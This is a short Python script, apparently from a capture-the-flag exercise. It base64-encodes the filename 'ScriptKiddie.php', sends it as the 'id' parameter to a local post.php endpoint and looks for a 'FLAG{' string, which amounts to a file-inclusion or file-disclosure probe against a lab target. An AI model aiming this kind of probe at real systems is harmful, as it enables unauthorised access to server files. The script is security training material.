import urllib.request
import base64

base_url = "http://127.0.0.1:32904/post.php"

# Test ScriptKiddie.php in base64
filename = "ScriptKiddie.php"
encoded = base64.b64encode(filename.encode()).decode()
url = f"{base_url}?id={encoded}"

print(f"Testing: {filename}")
print(f"Base64 encoded: {encoded}")
print(f"URL: {url}\n")

try:
    with urllib.request.urlopen(url, timeout=5) as response:
        data = response.read()
        print(f"Status: {response.status}")
        print(f"Size: {len(data)} bytes")
        
        text = data.decode('utf-8', errors='ignore')
        
        # Check for FLAG
        if 'FLAG{' in text:
            print("\n[!!!] FLAG FOUND")
            print(text)
        else:
            print(f"\nResponse preview:\n{text[:300]}")
            
except Exception as e:
    print(f"Error: {e}")

